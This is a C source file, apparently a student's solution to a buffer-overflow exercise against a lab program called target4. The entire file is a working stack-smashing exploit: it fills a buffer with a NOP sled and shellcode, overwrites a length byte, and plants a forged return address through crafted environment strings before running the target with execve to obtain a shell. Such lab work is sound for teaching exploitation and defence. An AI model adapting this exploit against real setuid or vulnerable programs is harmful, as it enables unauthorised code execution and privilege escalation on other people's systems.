#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define STACK_ADDR 0x202dfe60
#define BUFF_SIZE 168

int main(void)
{
	char buff[BUFF_SIZE + 2]; // 167 + \0 terminator
	int i, offset, target_addr;
	int shell_size = sizeof(shellcode) - 1;

	// fill with NOP
	for (i = 0; i < BUFF_SIZE; i++){
		buff[i] = 0x90; // NOP
	}

	// copy shell code
	offset = BUFF_SIZE - shell_size;
	for (i = 0; i < shell_size; i++){
		buff[offset + i] = shellcode[i];
	}

	buff[BUFF_SIZE ] = 0xC8; // 200 bytes
	buff[BUFF_SIZE + 1] = '\0';

	target_addr = STACK_ADDR - (16 * 11);
	char addr[4];
	addr[0] = (char)(target_addr & 0xff);
	addr[1] = (char)((target_addr >> 8) & 0xff);
	addr[2] = (char)((target_addr >> 16) & 0xff);
	addr[3] = (char)((target_addr >> 24) & 0xff);
	
	char *args[3];
	char *env[11];

	args[0] = TARGET; args[1] = buff; args[2] = NULL;

	env[0] = "\0";
	env[1] = "\0";
	env[2] = "\xB4";
	env[3] = "\0";
	env[4] = "\0";
	env[5] = "AAAAAAA"; // garbage 
	env[6] = addr; // new return address
	env[7] = "\0";
	env[8] = "\0";
	env[9] = "\0";
	env[10] = NULL;

	if (0 > execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
